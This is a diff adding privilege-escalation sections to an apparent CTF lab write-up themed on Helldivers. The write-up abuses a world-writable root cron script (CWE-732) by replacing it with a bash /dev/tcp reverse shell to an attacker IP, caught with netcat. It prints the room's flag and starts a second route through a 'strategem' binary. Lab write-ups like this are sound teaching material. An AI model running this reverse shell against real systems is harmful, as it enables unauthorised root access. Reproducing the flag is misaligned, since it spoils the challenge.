@@ -354,11 +354,95 @@ It turns out yes, yes we can escalate our privileges in both ways!
 ---
 
 ### Privilege escalation by Spreading Democracy each minute (Solution 1)
+How is a time scheduler called in linux?
+<br>[Cron](https://man7.org/linux/man-pages/man5/crontab.5.html).
 
+Where can we find it?<br>
+`/etc/crontab`
+
+What's inside?
+```
+john@super-earth:~$ cat /etc/crontab
+SHELL=/bin/sh
+
+* * * * * root /.super_earth_command_control/spread_democracy.sh
+```
+Based on the syntax: it runs a script with root privileges each minute.
+
+What is that script? What does it do? Can we modify it?
+```
+john@super-earth:~$ cd /.super_earth_command_control
+john@super-earth:/.super_earth_command_control$ ls -hal
+-rwx---rwx  1 root root  384 Aug 25 15:09 spread_democracy.sh
+```
+oh.. Other users have permissions to read it (r), modify it (w) and execute it (r). That should NOT happen. It's **CWE-732: Incorrect Permission Assignment for Critical Resource**
+
+Inside we have:
+(pho)
+
+It's PACKED with references and easter eggs!
+Let's focus. 
+If the script is run by `root`, each minute, and we can modify it - we can achieve pretty much everything we want on the system. The only constraint is to wait one minute per script execution.
+
+>before we continue, see how "strategem" command is being used? This will be shown in detail later on, as a second path to privilege escalation.
+
+Preparing the RCE:
+1. Create a listener on a free port on the attack machine: `nc -lvnp 7800`
+2. Modify spread_democracy.sh:
+```
+#!/bin/bash
+sh -i >& /dev/tcp/10.114.120.13/7800 0>&1
+```
+> Don't forget to change it to your IP and selected port!
+3. Wait.
+4. Pwned!
+
+You should see this after a minute:
+```
+root@ip-10-114-120-13:~# nc -lvnp 7800
+Listening on 0.0.0.0 7800
+Connection received on 10.114.143.187 41508
+sh: 0: can't access tty; job control turned off
+# 
+```
+
+```
+# cd /root
+# ls
+super_sample.txt
+```
+
+cat super_sample photo
+
+Done!
+
+Super Sample: `THM{H0W_4B0UT_A_CUP_0F_L1BER-TEA!}`
+
+Other fun solutions include:
+- enumerating /root directory and saving the results to john folder with john permissions
+- adding a new user with sudo permissions
+- 
 
 ---
 
 ### Privilege escalation by using a Strategem (Solution 2)
+
+*Oh sweet liberty! I need to use a strategem!*
+```
+john@super-earth:/$ strategem
+0
+john@super-earth:/$ 
+```
+*0?! What do you mean 0?!*
+> Little did John Helldiver know, that "0" means "successful exit" without errors.
+
+Help help help!
+
+```
+john@super-earth:/$ strategem --help
+Usage: strategem [OPTION] [COMMAND [ARG]...]
+Run COMMAND with an adjusted niceness, which affects process scheduling.
+```
 
 ---
 
@@ -373,3 +457,5 @@ It turns out yes, yes we can escalate our privileges in both ways!
 - SMB Client
 - [what is id rsa](https://www.reddit.com/r/linux4noobs/comments/wa43ms/what_is_id_rsa_in_ssh/)
 - [what is ssh key](https://www.sectigo.com/blog/what-is-an-ssh-key) 
+- [crontab](https://man7.org/linux/man-pages/man5/crontab.5.html)
+- [bad perms CWE](https://cwe.mitre.org/data/definitions/732.html)
